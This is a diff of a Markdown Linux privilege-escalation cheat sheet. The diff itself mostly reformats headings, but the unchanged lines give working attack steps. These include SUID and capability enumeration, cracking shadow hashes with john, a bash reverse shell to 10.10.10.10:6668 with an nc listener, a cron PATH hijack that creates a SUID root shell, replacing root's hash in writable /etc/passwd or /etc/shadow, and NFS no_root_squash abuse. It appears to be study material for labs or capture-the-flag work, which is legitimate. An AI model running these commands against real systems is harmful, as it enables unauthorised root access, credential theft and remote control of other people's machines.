@@ -1,10 +1,12 @@
 # _Privilege Escalation for Linux (Cheat-Sheet)_
 
-> **Sudo - Shell Escape Sequences**  
+> ## **Sudo - Shell Escape Sequences**
+>
 > command `sudo -l`  
 > Visit [GTFOBins](https://gtfobins.github.io/) Search result: search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.
 
-> **SUID (Set-user Identification)**  
+> ## **SUID (Set-user Identification)**
+>
 > _command_ `find / -type f -perm -04000 -ls 2>/dev/null`  
 > or  
 > `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null` will list files that have SUID or SGID bits set.  
@@ -20,11 +22,13 @@
 >  _command_ `unshadow passwd.txt shadow.txt > passwords`  
 >  `john passwords` -> default brute force or `john --wordlist=diccionario.lst --rules password`
 
-> **Capabilities**  
+> ## **Capabilities**
+>
 > _command_ `getcap -r / 2>/dev/null`  
 > Search [GTFOBins](https://gtfobins.github.io/) has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.
 
-> **Cron Jobs - File Permissions**  
+> ## **Cron Jobs - File Permissions**
+>
 > _command_ `cat /etc/crontab`  
 > `locate overwrite.sh` or `locate backup.sh`  
 > A similar situation where the "any.sh" script was deleted, but the cron job still exists.
@@ -40,7 +44,8 @@ bash -i >& /dev/tcp/10.10.10.10/6668 0>&1
 > We will now run a listener on our attacking machine to receive the incoming connection:  
 > _command_ `nc -nlvp 6668`
 
-> **Cron Jobs - PATH Enviroment Variable**  
+> ## **Cron Jobs - PATH Enviroment Variable**
+>
 > _command_ `cat /etc/crontab`  
 > Note that the PATH variable starts with /home/user which is our user's home directory.  
 > Create a file called overwrite.sh in your home directory with the following contents:  
@@ -57,22 +62,25 @@ chmod +xs /tmp/rootbash
 > `chmod +x /home/user/overwrite.sh`  
 > Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges: `/tmp/rootbash -p`
 
-> **Weak File Permissions - Writable /etc/passwd**  
+> ## **Weak File Permissions - Writable /etc/passwd**
+>
 > `ls -l /etc/passwd`  
 > Generate a new password hash with a password of your choice:  
 > `openssl passwd newpasswordhere`  
 > Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").  
 > Switch to the root user, using the new password.
 
-> **Weak File Permissions - Writable /etc/shadow**  
+> ## **Weak File Permissions - Writable /etc/shadow**
+>
 > `ls -l /etc/shadow`  
 > Generate a new password hash with a password of your choice:  
 > `mkpasswd -m sha-512 newpasswordhere`  
 > Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.  
 > Switch to the root user, using the new password.
 
-> **NFS (Network File Sharing)**  
->  configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.  
+> ## **NFS (Network File Sharing)**
+>
+> configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.  
 >  _command_ `cat /etc/exports`  
 >  The critical element for this privilege escalation vector is the “no_root_squash”. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.  
 >  We will start by enumerating mountable shares from our attacking machine: `showmount -e 10.10.10.10`  
